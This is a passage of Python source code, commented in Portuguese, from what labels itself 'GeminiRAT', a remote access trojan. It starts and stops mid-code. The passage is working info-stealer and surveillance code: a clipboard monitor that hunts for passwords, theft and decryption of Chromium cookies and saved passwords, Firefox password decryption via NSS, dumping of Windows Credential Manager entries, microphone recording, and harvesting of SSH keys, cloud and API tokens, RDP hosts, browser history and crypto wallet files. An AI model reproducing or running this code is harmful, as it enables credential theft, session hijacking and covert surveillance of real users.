        ("email",              r"\b[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}\b"),
    ]
    for label, pat in patterns:
        if re.search(pat, text):
            return label
    return None

def _clipboard_monitor_loop(result_container, interval, max_captures, keywords):
    """Loop interno do monitor. Roda em thread separada."""
    global _clipboard_monitor_active
    captures = []
    last_content = None
    captured_count = 0

    while _clipboard_monitor_active:
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            try:
                if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                    content = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                elif win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                    raw = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                    content = raw.decode('utf-8', errors='replace')
                else:
                    content = None
            finally:
                win32clipboard.CloseClipboard()

            if content and content != last_content:
                last_content = content
                pattern_type = _clipboard_detect_pattern(content)
                # Captura se: detectou padrao, ou keyword presente, ou captura_tudo
                keyword_hit = any(k.lower() in content.lower() for k in keywords) if keywords else False
                capture_all = (not keywords and pattern_type is None)
                if pattern_type or keyword_hit or capture_all:
                    import datetime as _dt
                    captures.append({
                        "timestamp": _dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "pattern":   pattern_type or ("keyword_match" if keyword_hit else "generic"),
                        "content":   content[:2000],
                    })
                    captured_count += 1
                    write_internal_log("ClipboardMonitor: captura #" + str(captured_count) + " tipo=" + str(pattern_type))
                    if max_captures and captured_count >= max_captures:
                        break
        except Exception as e:
            write_internal_log("ClipboardMonitor erro: " + str(e))

        duration = interval
        if duration < 1.0:
            duration = 1.0
        time.sleep(duration)

    _clipboard_monitor_active = False
    result_container.append((captures if captures else [{"info": "Nenhuma captura relevante detectada."}], "clipboard_monitor_result"))

def start_clipboard_monitor(args=None):
    """
    Inicia monitor continuo de clipboard em background.
    args: {"interval": 2, "max_captures": 50, "keywords": ["senha", "pass"]}
    Tecnica: T1115 - Clipboard Data (monitoramento continuo).
    """
    global _clipboard_monitor_active, _clipboard_monitor_thread
    if _clipboard_monitor_active:
        return "ClipboardMonitor ja esta ativo.", "info"
    # Teste de disponibilidade antes de iniciar a thread.
    # win32clipboard.OpenClipboard() a partir de thread sem message pump pode
    # causar crash de processo no Windows — verificamos antes.
    try:
        import win32clipboard as _wcb_test
        _wcb_test.OpenClipboard()
        _wcb_test.CloseClipboard()
    except ImportError:
        return "clipboard_monitor indisponivel: win32clipboard nao instalado neste build.", "error"
    except Exception as _e:
        return "clipboard_monitor indisponivel neste ambiente: " + str(_e), "error"
    try:
        cfg = args if isinstance(args, dict) else {}
        interval     = max(1, int(cfg.get("interval", 2)))
        max_captures = int(cfg.get("max_captures", 0))  # 0 = ilimitado
        keywords     = cfg.get("keywords", [])
        _clipboard_monitor_active = True
        result_container = []
        t = threading.Thread(
            target=_clipboard_monitor_loop,
            args=(result_container, interval, max_captures, keywords),
            daemon=True
        )
        t.start()
        _clipboard_monitor_thread = t
        msg = "ClipboardMonitor iniciado (interval=" + str(interval) + "s"
        if max_captures:
            msg += " max=" + str(max_captures)
        if keywords:
            msg += " keywords=" + str(keywords)
        msg += "). Use clipboard_monitor_stop para encerrar."
        return msg, "info"
    except Exception as e:
        _clipboard_monitor_active = False
        return "Erro ao iniciar ClipboardMonitor: " + str(e), "error"

def stop_clipboard_monitor(args=None):
    """Para o monitor de clipboard e retorna todas as capturas acumuladas."""
    global _clipboard_monitor_active, _clipboard_monitor_thread
    if not _clipboard_monitor_active:
        return "ClipboardMonitor nao esta ativo.", "info"
    _clipboard_monitor_active = False
    if _clipboard_monitor_thread:
        _clipboard_monitor_thread.join(timeout=5)
    _clipboard_monitor_thread = None
    return "ClipboardMonitor encerrado.", "info"


# ==============================================================================
# BROWSER SESSION EXPORT — cookies formato Netscape (T1539)
# ==============================================================================

def export_browser_sessions(args=None):
    """
    Exporta cookies de todos os navegadores Chromium no formato Netscape
    (compativel com curl --cookie-jar, Burp Suite, Caido).
    Permite replay de sessoes autenticadas sem precisar da senha.
    Tecnica: T1539 - Steal Web Session Cookie.

    args: {"browser": "chrome"} para filtrar por navegador (opcional)
    """
    filter_browser = None
    if isinstance(args, dict):
        filter_browser = args.get("browser", "").lower() or None

    profiles = _chromium_profiles()
    if not profiles:
        return "Nenhum navegador Chromium encontrado.", "error"

    all_sessions = []
    errors = []

    for browser_name, base_path in profiles:
        if filter_browser and filter_browser not in browser_name.lower():
            continue

        key = _get_encryption_key_for(base_path)
        if not key:
            errors.append(browser_name + ": falha ao obter chave DPAPI")
            continue

        cookies_db = os.path.join(base_path, "Default", "Network", "Cookies")
        if not os.path.exists(cookies_db):
            # Caminho alternativo (versoes mais antigas)
            cookies_db = os.path.join(base_path, "Default", "Cookies")
        if not os.path.exists(cookies_db):
            errors.append(browser_name + ": banco de cookies nao encontrado")
            continue

        temp_db = "temp_cookies_" + browser_name.lower() + ".db"
        try:
            shutil.copy2(cookies_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT host_key, name, encrypted_value, path,
                       expires_utc, is_secure, is_httponly
                FROM cookies
                ORDER BY host_key
            """)
            rows = cursor.fetchall()
            conn.close()

            netscape_lines = ["# Netscape HTTP Cookie File", "# Exportado por GeminiRAT - " + browser_name, ""]
            cookie_count = 0
            for host_key, name, enc_val, path, expires_utc, is_secure, is_httponly in rows:
                try:
                    # Descriptografa o valor do cookie
                    if enc_val[:3] == b'v10' or enc_val[:3] == b'v11':
                        import base64 as _b64
                        from Cryptodome.Cipher import AES as _AES
                        raw = enc_val[3:]
                        nonce, ciphertext, tag = raw[:12], raw[12:-16], raw[-16:]
                        cipher = _AES.new(key, _AES.MODE_GCM, nonce=nonce)
                        value = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='replace')
                    else:
                        import ctypes as _ct
                        import ctypes.wintypes as _wt
                        class DATA_BLOB(_ct.Structure):
                            pass
                        setattr(DATA_BLOB, '_fields_', [('cbData', _wt.DWORD), ('pbData', _ct.POINTER(_ct.c_char))])
                        p = _ct.create_string_buffer(enc_val, len(enc_val))
                        blobin = DATA_BLOB(_ct.sizeof(p), p)
                        blobout = DATA_BLOB()
                        _ct.windll.Crypt32.CryptUnprotectData(
                            _ct.byref(blobin), None, None, None, None, 0, _ct.byref(blobout))
                        value = _ct.string_at(blobout.pbData, blobout.cbData).decode('utf-8', errors='replace')
                except Exception:
                    value = "<encrypted>"

                # Converte timestamp Chrome (microsegundos desde 1601) para Unix
                try:
                    expires_unix = int((expires_utc - 11644473600000000) / 1000000) if expires_utc else 0
                except Exception:
                    expires_unix = 0

                secure_flag = "TRUE" if is_secure else "FALSE"
                http_flag   = "TRUE" if is_httponly else "FALSE"
                # Formato Netscape: domain TAB flag TAB path TAB secure TAB expires TAB name TAB value
                domain_flag = "TRUE" if host_key.startswith(".") else "FALSE"
                line = "\t".join([
                    host_key, domain_flag, path, secure_flag,
                    str(expires_unix), name, value
                ])
                netscape_lines.append(line)
                cookie_count += 1

            session_data = {
                "browser":      browser_name,
                "cookie_count": cookie_count,
                "netscape":     "\n".join(netscape_lines),
                "usage":        "curl -b cookies.txt https://alvo.com  |  Burp: Project > Import Cookie Jar",
            }
            all_sessions.append(session_data)
            write_internal_log("SessionExport: " + browser_name + " - " + str(cookie_count) + " cookies exportados")

        except Exception as e:
            errors.append(browser_name + ": " + str(e))
        finally:
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except Exception:
                    pass

    if not all_sessions and errors:
        return "Falha ao exportar sessoes. Detalhes: " + " | ".join(errors), "error"
    if errors:
        all_sessions.append({"browser": "ERROS_PARCIAIS", "detalhes": " | ".join(errors)})

    return all_sessions, "session_export_result"


# ==============================================================================
# AUDIO CAPTURE — gravacao de microfone (T1123)
# ==============================================================================

def capture_audio(args=None):
    """
    Grava o microfone por N segundos e retorna o audio como arquivo WAV em base64.
    Tecnica: T1123 - Audio Capture.

    Implementacao: WinMM/MCI via ctypes — zero dependencias externas.
    winmm.dll esta presente em qualquer instalacao do Windows.

    args: {"duration": 10, "samplerate": 16000}
    """
    if platform.system() != "Windows":
        return "Audio Capture disponivel apenas no Windows.", "error"

    import ctypes as _ct
    import tempfile as _tmp
    import base64 as _b64
    import time as _time

    cfg        = args if isinstance(args, dict) else {}
    duration   = max(1, min(120, int(cfg.get("duration", 10))))
    samplerate = int(cfg.get("samplerate", 16000))

    # winmm.dll — sempre disponivel no Windows; MCI e a interface de mais alto nivel
    winmm = _ct.windll.winmm
    winmm.mciSendStringW.restype  = _ct.c_ulong
    winmm.mciSendStringW.argtypes = [_ct.c_wchar_p, _ct.c_wchar_p, _ct.c_uint, _ct.c_void_p]

    _alias   = "_gemcap_" + str(os.getpid())   # alias unico por processo
    _opened  = False
    tmp_path = None

    def _mci(cmd):
        buf = _ct.create_unicode_buffer(512)
        err = winmm.mciSendStringW(cmd, buf, 512, None)
        return err, buf.value

    try:
        # Cria arquivo temp para receber o WAV
        tmp_fd, tmp_path = _tmp.mkstemp(suffix=".wav")
        os.close(tmp_fd)

        # Abre dispositivo de audio
        err, _ = _mci("open new type waveaudio alias " + _alias)
        if err != 0:
            return ("Erro ao abrir dispositivo de audio MCI (codigo " + str(err) +
                    "). Microfone conectado e habilitado?"), "error"
        _opened = True

        # Configura formato: mono, 16-bit, taxa configuravel
        _mci("set " + _alias + " time format milliseconds")
        _mci("set " + _alias + " channels 1 samplespersec " + str(samplerate) +
             " bitspersample 16 alignment 2")

        # Grava
        write_internal_log("AudioCapture: gravando " + str(duration) + "s a " +
                           str(samplerate) + "Hz via WinMM/MCI")
        err, _ = _mci("record " + _alias)
        if err != 0:
            return "Erro ao iniciar gravacao MCI (codigo " + str(err) + ").", "error"

        _time.sleep(duration)
        _mci("stop " + _alias)

        # Salva em arquivo WAV (path entre aspas para suportar espacos)
        safe_path = tmp_path.replace("\\", "/")
        err, _ = _mci('save ' + _alias + ' "' + safe_path + '"')
        _mci("close " + _alias)
        _opened = False

        # Verifica arquivo gerado (cabecalho WAV minimo = 44 bytes)
        if not os.path.exists(tmp_path) or os.path.getsize(tmp_path) < 44:
            return "Erro: arquivo WAV nao gerado — verifique permissoes do microfone.", "error"

        with open(tmp_path, "rb") as fh:
            wav_bytes = fh.read()

        wav_b64 = _b64.b64encode(wav_bytes).decode("ascii")
        size_kb = round(len(wav_bytes) / 1024, 1)

        write_internal_log("AudioCapture: concluido - " + str(size_kb) + "KB")
        return {
            "duration_s": duration,
            "samplerate": samplerate,
            "size_kb":    size_kb,
            "filename":   "audio_capture.wav",
            "wav_b64":    wav_b64,
        }, "audio_capture_result"

    except Exception as e:
        import traceback as _tb
        return "Erro ao capturar audio: " + str(e) + "\n" + _tb.format_exc(), "error"

    finally:
        if _opened:
            try:
                _mci("close " + _alias)
            except Exception:
                pass
        if tmp_path and os.path.exists(tmp_path):
            try:
                os.unlink(tmp_path)
            except Exception:
                pass


def capture_credentials(args=None):
    """
    Extrai credenciais salvas de todos os navegadores Chromium encontrados
    (Chrome, Edge, Brave, Opera, Vivaldi).
    Falha graciosamente por navegador — reporta erros sem parar os demais.
    """
    profiles = _chromium_profiles()
    if not profiles:
        return "Nenhum navegador Chromium encontrado no sistema (Chrome, Edge, Brave, Opera, Vivaldi).", "error"

    all_credentials = []
    errors = []

    for browser_name, base_path in profiles:
        key = _get_encryption_key_for(base_path)
        if not key:
            # DPAPI falhou para este browser (agente rodando como SYSTEM, ou perfil corrompido)
            errors.append(browser_name + ": falha ao obter chave de criptografia (agente como SYSTEM?)")
            continue

        login_db = os.path.join(base_path, "Default", "Login Data")
        if not os.path.exists(login_db):
            errors.append(browser_name + ": Login Data nao encontrado")
            continue

        temp_db = "temp_cred_" + browser_name.lower() + ".db"
        try:
            shutil.copy2(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
            for origin_url, action_url, username, encrypted_password in cursor.fetchall():
                if username and encrypted_password:
                    all_credentials.append({
                        "browser":    browser_name,
                        "origin_url": origin_url,
                        "action_url": action_url,
                        "username":   username,
                        "password":   decrypt_password(encrypted_password, key),
                    })
            conn.close()
        except Exception as e:
            errors.append(browser_name + ": " + str(e))
        finally:
            if os.path.exists(temp_db):
                try: os.remove(temp_db)
                except Exception: pass

    if not all_credentials and errors:
        return "Credenciais nao encontradas. Detalhes: " + " | ".join(errors), "error"

    # Inclui erros parciais como entrada informativa
    if errors:
        all_credentials.append({"browser": "AVISO", "origin_url": " | ".join(errors), "username": "", "password": ""})

    return all_credentials, "credentials_result"


# ==============================================================================
# FIREFOX CREDENTIALS (T1555.003)
# Usa NSS via ctypes para decriptar key4.db + logins.json — sem dependências extras.
# ==============================================================================

def _nss_decrypt(nss3_dll, encrypted_b64: str) -> str:
    """Decripta um campo do Firefox usando NSS (SECItem via ctypes)."""
    class SECItem(ctypes.Structure):
        _fields_ = [("type", ctypes.c_uint), ("data", ctypes.c_char_p), ("len", ctypes.c_uint)]

    inp  = SECItem()
    out  = SECItem()
    enc  = base64.b64decode(encrypted_b64)
    inp.data = ctypes.c_char_p(enc)
    inp.len  = len(enc)
    if nss3_dll.PK11SDR_Decrypt(ctypes.byref(inp), ctypes.byref(out), None) == 0:
        return ctypes.string_at(out.data, out.len).decode("utf-8", errors="replace")
    return ""


def capture_firefox_credentials(args=None):
    """
    Extrai credenciais salvas do Firefox (todos os perfis) via NSS (nss3.dll).
    Não requer módulos externos além de ctypes — bundled no Python.
    """
    if platform.system() != "Windows":
        return "Firefox credentials: suporte apenas Windows.", "error"

    ff_base = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
    if not os.path.isdir(ff_base):
        return "Firefox não encontrado no sistema.", "error"

    # Localiza nss3.dll — pode estar no diretório do Firefox ou em System32
    nss3_path = None
    candidates = [
        r"C:\Program Files\Mozilla Firefox\nss3.dll",
        r"C:\Program Files (x86)\Mozilla Firefox\nss3.dll",
    ]
    for c in candidates:
        if os.path.exists(c):
            nss3_path = c
            break

    if not nss3_path:
        return "nss3.dll não encontrada. Firefox instalado?", "error"

    try:
        nss3 = ctypes.CDLL(nss3_path)
    except Exception as e:
        return f"Falha ao carregar nss3.dll: {e}", "error"

    all_creds = []
    errors    = []

    for profile_dir in os.listdir(ff_base):
        profile_path = os.path.join(ff_base, profile_dir)
        logins_json  = os.path.join(profile_path, "logins.json")
        key4_db      = os.path.join(profile_path, "key4.db")

        if not os.path.exists(logins_json) or not os.path.exists(key4_db):
            continue

        try:
            # Inicializa NSS com o perfil atual
            ret = nss3.NSS_Init(profile_path.encode("utf-8"))
            if ret != 0:
                errors.append(f"{profile_dir}: NSS_Init falhou ({ret})")
                continue

            with open(logins_json, "r", encoding="utf-8") as f:
                data = json.load(f)

            for entry in data.get("logins", []):
                try:
                    url      = entry.get("hostname", "")
                    user_enc = entry.get("encryptedUsername", "")
                    pass_enc = entry.get("encryptedPassword", "")
                    username = _nss_decrypt(nss3, user_enc) if user_enc else ""
                    password = _nss_decrypt(nss3, pass_enc) if pass_enc else ""
                    if username or password:
                        all_creds.append({
                            "browser":  f"Firefox ({profile_dir[:20]})",
                            "url":      url,
                            "username": username,
                            "password": password,
                        })
                except Exception as e:
                    errors.append(f"{profile_dir}: {e}")

            nss3.NSS_Shutdown()

        except Exception as e:
            errors.append(f"{profile_dir}: {e}")
            try: nss3.NSS_Shutdown()
            except Exception: pass

    if not all_creds and errors:
        return "Firefox: " + " | ".join(errors), "error"
    if errors:
        all_creds.append({"browser": "AVISO", "url": " | ".join(errors), "username": "", "password": ""})

    return all_creds, "credentials_result"


# ==============================================================================
# WINDOWS CREDENTIAL MANAGER (T1555.004)
# CredEnumerate via ctypes — retorna credenciais genéricas, VPNs, RDPs, etc.
# ==============================================================================

def capture_credential_manager(args=None):
    """
    Extrai credenciais do Windows Credential Manager via CredEnumerate.
    Retorna: URLs/hosts, usernames e passwords em texto claro (quando disponíveis).
    """
    if platform.system() != "Windows":
        return "Credential Manager: suporte apenas Windows.", "error"

    try:
        advapi32 = ctypes.WinDLL("Advapi32.dll", use_last_error=True)

        class CREDENTIAL(ctypes.Structure):
            _fields_ = [
                ("Flags",              ctypes.c_ulong),
                ("Type",               ctypes.c_ulong),
                ("TargetName",         ctypes.c_wchar_p),
                ("Comment",            ctypes.c_wchar_p),
                ("LastWritten",        ctypes.c_ulonglong),
                ("CredentialBlobSize", ctypes.c_ulong),
                ("CredentialBlob",     ctypes.c_char_p),
                ("Persist",            ctypes.c_ulong),
                ("AttributeCount",     ctypes.c_ulong),
                ("Attributes",         ctypes.c_void_p),
                ("TargetAlias",        ctypes.c_wchar_p),
                ("UserName",           ctypes.c_wchar_p),
            ]

        advapi32.CredEnumerateW.restype  = ctypes.c_bool
        advapi32.CredEnumerateW.argtypes = [
            ctypes.c_wchar_p,
            ctypes.c_ulong,
            ctypes.POINTER(ctypes.c_ulong),
            ctypes.POINTER(ctypes.POINTER(ctypes.POINTER(CREDENTIAL))),
        ]
        advapi32.CredFree.restype  = None
        advapi32.CredFree.argtypes = [ctypes.c_void_p]

        count     = ctypes.c_ulong(0)
        cred_list = ctypes.POINTER(ctypes.POINTER(CREDENTIAL))()

        ok = advapi32.CredEnumerateW(None, 0, ctypes.byref(count), ctypes.byref(cred_list))
        if not ok:
            return f"CredEnumerateW falhou (erro {ctypes.get_last_error()}).", "error"

        results = []
        for i in range(count.value):
            try:
                c        = cred_list[i].contents
                target   = c.TargetName   or ""
                username = c.UserName     or ""
                password = ""
                if c.CredentialBlob and c.CredentialBlobSize:
                    try:
                        password = ctypes.string_at(c.CredentialBlob, c.CredentialBlobSize).decode("utf-16-le", errors="replace")
                    except Exception:
                        password = "<blob binário>"
                if target or username:
                    results.append({"target": target, "username": username, "password": password})
            except Exception:
                continue

        advapi32.CredFree(cred_list)

        if not results:
            return "Credential Manager vazio ou sem permissão.", "error"
        return results, "credential_manager_result"

    except Exception as e:
        return f"Erro no Credential Manager: {e}", "error"


# ==============================================================================
# SSH KEYS (T1552.004)
# ==============================================================================

def capture_ssh_keys(args=None):
    """
    Varre ~/.ssh/ e perfis de usuários em busca de chaves SSH privadas.
    Retorna o conteúdo das chaves encontradas.
    """
    search_roots = []

    # Perfil do usuário atual
    user_home = os.path.expanduser("~")
    search_roots.append(user_home)

    # Outros usuários (Windows)
    if platform.system() == "Windows":
        users_root = os.environ.get("SystemDrive", "C:") + "\\Users"
        if os.path.isdir(users_root):
            for u in os.listdir(users_root):
                p = os.path.join(users_root, u)
                if os.path.isdir(p) and p.lower() != user_home.lower():
                    search_roots.append(p)

    # Padrões de chaves privadas OpenSSH
    KEY_PATTERNS = ("id_rsa", "id_ecdsa", "id_ed25519", "id_dsa", "*.pem", "*.key")

    found = []
    for root in search_roots:
        ssh_dir = os.path.join(root, ".ssh")
        if not os.path.isdir(ssh_dir):
            continue
        for fname in os.listdir(ssh_dir):
            fpath = os.path.join(ssh_dir, fname)
            # Inclui chaves privadas (sem extensão .pub) e arquivos .pem/.key
            if fname.endswith(".pub") or not os.path.isfile(fpath):
                continue
            is_key = any(fname == pat or fname.startswith(pat.rstrip("*")) for pat in KEY_PATTERNS)
            if not is_key and not (fname.endswith(".pem") or fname.endswith(".key")):
                # Tenta detectar pelo conteúdo
                try:
                    with open(fpath, "r", errors="ignore") as f:
                        first = f.read(40)
                    if "BEGIN" not in first or "PRIVATE KEY" not in first:
                        continue
                except Exception:
                    continue
            try:
                with open(fpath, "r", errors="ignore") as f:
                    content = f.read()
                if "PRIVATE KEY" in content or "BEGIN RSA" in content or "BEGIN EC" in content:
                    found.append({"path": fpath, "content": content})
            except Exception:
                continue

    if not found:
        return "Nenhuma chave SSH privada encontrada.", "error"
    return found, "ssh_keys_result"


# ==============================================================================
# ENV TOKENS (T1552.001 / T1552.003)
# Varre variáveis de ambiente e arquivos .env por tokens de cloud/serviços.
# ==============================================================================

def capture_env_tokens(args=None):
    """
    Coleta tokens e segredos de cloud/serviços de:
      - Variáveis de ambiente do processo atual
      - Arquivos .env, .env.*, *.env em locais comuns
      - ~/.aws/credentials, ~/.azure/, ~/.config/gcloud/
      - ~/.gitconfig (credenciais Git)
    """
    SENSITIVE_KEYS = (
        "AWS_ACCESS_KEY", "AWS_SECRET", "AWS_SESSION_TOKEN",
        "AZURE_CLIENT_SECRET", "AZURE_CLIENT_ID", "AZURE_TENANT",
        "GOOGLE_APPLICATION_CREDENTIALS", "GCLOUD_PROJECT",
        "GITHUB_TOKEN", "GITLAB_TOKEN", "BITBUCKET",
        "DATABASE_URL", "DB_PASSWORD", "MYSQL_PASSWORD", "POSTGRES_PASSWORD",
        "SECRET_KEY", "API_KEY", "API_SECRET", "ACCESS_TOKEN",
        "PRIVATE_KEY", "AUTH_TOKEN", "BEARER",
        "HEROKU_API_KEY", "DIGITALOCEAN_TOKEN", "CLOUDFLARE_API_TOKEN",
        "SENDGRID_API_KEY", "STRIPE_SECRET", "TWILIO_AUTH_TOKEN",
        "SLACK_TOKEN", "DISCORD_TOKEN", "TELEGRAM_BOT_TOKEN",
    )

    found = {}

    # 1. Variáveis de ambiente
    for k, v in os.environ.items():
        if any(pat in k.upper() for pat in SENSITIVE_KEYS) and v:
            found[f"ENV:{k}"] = v

    # 2. Arquivos .env em locais comuns
    home = os.path.expanduser("~")
    env_search_dirs = [home, os.getcwd()]
    if platform.system() == "Windows":
        env_search_dirs.append(os.environ.get("USERPROFILE", ""))
    for d in env_search_dirs:
        if not os.path.isdir(d):
            continue
        try:
            for fname in os.listdir(d):
                if fname.startswith(".env") or fname.endswith(".env"):
                    fpath = os.path.join(d, fname)
                    if not os.path.isfile(fpath):
                        continue
                    try:
                        with open(fpath, "r", errors="ignore") as f:
                            for line in f:
                                line = line.strip()
                                if "=" in line and not line.startswith("#"):
                                    k, _, v = line.partition("=")
                                    k = k.strip().upper()
                                    if any(pat in k for pat in SENSITIVE_KEYS):
                                        found[f"{fpath}:{k}"] = v.strip()
                    except Exception:
                        pass
        except Exception:
            pass

    # 3. AWS credentials
    aws_creds = os.path.join(home, ".aws", "credentials")
    if os.path.isfile(aws_creds):
        try:
            with open(aws_creds, "r", errors="ignore") as f:
                found["aws_credentials"] = f.read()
        except Exception:
            pass

    # 4. GCloud application_default_credentials.json
    gcloud_creds = os.path.join(home, ".config", "gcloud", "application_default_credentials.json")
    if os.path.isfile(gcloud_creds):
        try:
            with open(gcloud_creds, "r", errors="ignore") as f:
                found["gcloud_credentials"] = f.read()
        except Exception:
            pass

    # 5. Git credentials
    gitconfig = os.path.join(home, ".gitconfig")
    if os.path.isfile(gitconfig):
        try:
            with open(gitconfig, "r", errors="ignore") as f:
                content = f.read()
            if "token" in content.lower() or "password" in content.lower() or "url" in content.lower():
                found["gitconfig"] = content
        except Exception:
            pass

    if not found:
        return "Nenhum token ou segredo de ambiente encontrado.", "error"
    return found, "env_tokens_result"


# ===========================================================================
# MÓDULO DE COLETA EXPANDIDA (🟢 Green)
# ===========================================================================

def capture_browser_history(args=None):
    """
    Coleta histórico de navegação e bookmarks de Chrome, Firefox e Edge
    via leitura direta dos bancos SQLite (sem dependências externas).
    Copia o arquivo para um temporário antes de abrir (evita lock do browser).
    """
    import sqlite3 as _sq
    import shutil as _sh
    import tempfile as _tf

    home = os.path.expanduser("~")
    result = {}

    # Perfis e arquivos a coletar por browser
    targets = []

    # Chrome / Chromium
    chrome_base = os.path.join(
        os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"
    )
    for profile in ("Default", "Profile 1", "Profile 2", "Profile 3"):
        p = os.path.join(chrome_base, profile)
        if os.path.isdir(p):
            targets.append(("Chrome-" + profile, os.path.join(p, "History"), "sqlite_history"))
            targets.append(("Chrome-" + profile, os.path.join(p, "Bookmarks"), "json_bookmarks"))

    # Edge
    edge_base = os.path.join(
        os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data"
    )
    for profile in ("Default", "Profile 1"):
        p = os.path.join(edge_base, profile)
        if os.path.isdir(p):
            targets.append(("Edge-" + profile, os.path.join(p, "History"), "sqlite_history"))
            targets.append(("Edge-" + profile, os.path.join(p, "Bookmarks"), "json_bookmarks"))

    # Firefox
    ff_profiles = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
    if os.path.isdir(ff_profiles):
        for prof_dir in os.listdir(ff_profiles):
            full = os.path.join(ff_profiles, prof_dir)
            if os.path.isdir(full):
                targets.append(("Firefox-" + prof_dir, os.path.join(full, "places.sqlite"), "sqlite_ff"))

    limit = 500  # max URLs por perfil

    for label, fpath, ftype in targets:
        if not os.path.isfile(fpath):
            continue
        try:
            if ftype == "sqlite_history":
                tmp = _tf.mktemp(suffix=".db")
                _sh.copy2(fpath, tmp)
                try:
                    con = _sq.connect(tmp)
                    rows = con.execute(
                        "SELECT url, title, visit_count, last_visit_time "
                        "FROM urls ORDER BY last_visit_time DESC LIMIT ?",
                        (limit,)
                    ).fetchall()
                    con.close()
                    result[label + "_history"] = [
                        {"url": r[0], "title": r[1], "visits": r[2]}
                        for r in rows
                    ]
                finally:
                    try:
                        os.remove(tmp)
                    except Exception:
                        pass

            elif ftype == "sqlite_ff":
                tmp = _tf.mktemp(suffix=".db")
                _sh.copy2(fpath, tmp)
                try:
                    con = _sq.connect(tmp)
                    rows = con.execute(
                        "SELECT p.url, p.title, p.visit_count "
                        "FROM moz_places p "
                        "ORDER BY p.last_visit_date DESC LIMIT ?",
                        (limit,)
                    ).fetchall()
                    con.close()
                    result[label + "_history"] = [
                        {"url": r[0], "title": r[1], "visits": r[2]}
                        for r in rows
                    ]
                finally:
                    try:
                        os.remove(tmp)
                    except Exception:
                        pass

            elif ftype == "json_bookmarks":
                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                    data = json.load(f)

                def _extract_bm(node, out):
                    if isinstance(node, dict):
                        if node.get("type") == "url":
                            out.append({"name": node.get("name", ""), "url": node.get("url", "")})
                        for child in node.get("children", []):
                            _extract_bm(child, out)
                    elif isinstance(node, list):
                        for item in node:
                            _extract_bm(item, out)

                bms = []
                _extract_bm(data.get("roots", {}), bms)
                if bms:
                    result[label + "_bookmarks"] = bms

        except Exception as e:
            result[label + "_error"] = str(e)

    if not result:
        return "Nenhum historico de navegacao encontrado.", "error"
    return result, "browser_history_result"


def capture_rdp_credentials(args=None):
    """
    Coleta hosts e usernames de conexoes RDP salvas no Windows.
    Localiza em HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers.
    Senhas sao armazenadas como DPAPI blobs — reporta o username (nao a senha).
    """
    if platform.system() != "Windows":
        return "Apenas Windows.", "error"

    result = {}
    try:
        base_key = r"Software\Microsoft\Terminal Server Client\Servers"
        reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER, base_key)
        i = 0
        while True:
            try:
                server = winreg.EnumKey(reg, i)
                i += 1
                try:
                    srv_key = winreg.OpenKey(reg, server)
                    username = winreg.QueryValueEx(srv_key, "UsernameHint")[0]
                    winreg.CloseKey(srv_key)
                    result[server] = username
                except Exception:
                    result[server] = "(sem username salvo)"
            except OSError:
                break
        winreg.CloseKey(reg)
    except Exception as e:
        return "Erro ao ler RDP registry: " + str(e), "error"

    # MRU (Most Recently Used) — ordem de uso
    mru = []
    try:
        mru_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Terminal Server Client\Default"
        )
        j = 0
        while True:
            try:
                name, val, _ = winreg.EnumValue(mru_key, j)
                j += 1
                mru.append(val)
            except OSError:
                break
        winreg.CloseKey(mru_key)
    except Exception:
        pass

    if mru:
        result["__MRU__"] = mru

    if not result:
        return "Nenhuma conexao RDP salva encontrada.", "error"
    return result, "rdp_credentials_result"


def capture_crypto_wallets(args=None):
    """
    Detecta e coleta arquivos de carteiras de criptomoedas:
      - Bitcoin Core: wallet.dat
      - Electrum: wallets/*.wallet (JSON)
      - Exodus: exodus.wallet/
      - MetaMask: dados de extensao Chrome/Firefox (vault criptografado)
      - Atomic, Coinbase Wallet, Trust Wallet (Electron apps)
    Nao decripta — exfiltra os arquivos para analise offline.
    """
    home = os.path.expanduser("~")
    appdata = os.environ.get("APPDATA", "")
    localappdata = os.environ.get("LOCALAPPDATA", "")
    result = {}

    # Paths fixos de wallets conhecidas
    wallet_paths = [
        ("Bitcoin_Core", os.path.join(appdata, "Bitcoin", "wallets", "wallet.dat")),
        ("Bitcoin_Core_alt", os.path.join(appdata, "Bitcoin", "wallet.dat")),
        ("Electrum_wallet", os.path.join(appdata, "Electrum", "wallets")),
        ("Exodus", os.path.join(appdata, "Exodus", "exodus.wallet")),
        ("Exodus_Local", os.path.join(localappdata, "Exodus", "exodus.wallet")),
        ("AtomicWallet", os.path.join(appdata, "atomic", "Local Storage", "leveldb")),
        ("Coinbase", os.path.join(appdata, "Coinbase", "Local Storage", "leveldb")),
        ("Guarda", os.path.join(appdata, "Guarda", "Local Storage", "leveldb")),
        ("Jaxx", os.path.join(appdata, "com.liberty.jaxx", "Local Storage", "leveldb")),
    ]

    for name, path in wallet_paths:
        if os.path.isfile(path):
            try:
                with open(path, "rb") as f:
                    data = f.read(1024 * 256)  # max 256 KB
                result[name] = base64.b64encode(data).decode()
            except Exception as e:
                result[name + "_error"] = str(e)
        elif os.path.isdir(path):
            try:
                files_found = []
                for root, _, files in os.walk(path):
                    for fname in files:
                        files_found.append(os.path.join(root, fname))
                        if len(files_found) >= 20:
                            break
                    if len(files_found) >= 20:
                        break
                result[name + "_dir"] = files_found
            except Exception as e:
                result[name + "_error"] = str(e)

    # MetaMask — extensao Chrome
    mm_chrome = os.path.join(
